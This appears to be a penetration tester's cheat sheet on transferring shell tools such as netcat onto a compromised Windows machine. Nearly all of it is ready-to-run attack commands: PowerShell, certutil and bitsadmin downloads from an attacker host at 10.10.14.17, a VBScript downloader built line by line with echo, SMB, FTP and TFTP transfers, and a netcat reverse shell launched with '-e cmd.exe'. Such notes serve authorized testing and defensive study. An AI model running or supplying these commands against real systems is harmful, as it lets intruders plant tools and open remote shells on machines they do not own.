# Uploading Shells to Windows

## Powershell

```
powershell.exe wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe"

powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')

powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")


```

## Certutil

```
certutil.exe -urlcache -split -f "http://10.10.14.17/nc.exe" c:\temp\nc.exe
```

## Bitsadmin (BITS)

```
bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
```

## VBScript

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Call with:

```
cscript /nologo wget.vbs http://10.10.14.17/nc.exe nc.exe
```

## SMB (Samba)

- Create SMB share using impacket
- Call `net view \\<IP>`
- List with `dir \\<IP>\SHARE`
- Download with `copy \\10.10.14.17\SHARE\nc.exe .`
- Or: Upload from victim: `copy nc2.exe \\<IP>\SHARE\nc2.exe`

**Or execute directly:**

```
\\<IP>\SHARE\nc.exe -nv <IP> 4444 -e cmd.exe
```

## FTP

Some windows version have an interactive version of an ftp client. It's possible to script its usage:

```
echo open <IP>> ftp.txt
echo USER ftp>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

Call with: `ftp -v -n -s:ftp.txt`

## TFTP

- Start with `atftpd --daemon --port 69 ~/dir`
- Download: `tftp -i <IP> GET nc.exe`

## Resources

- [Post Exploitation File Transfers](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)
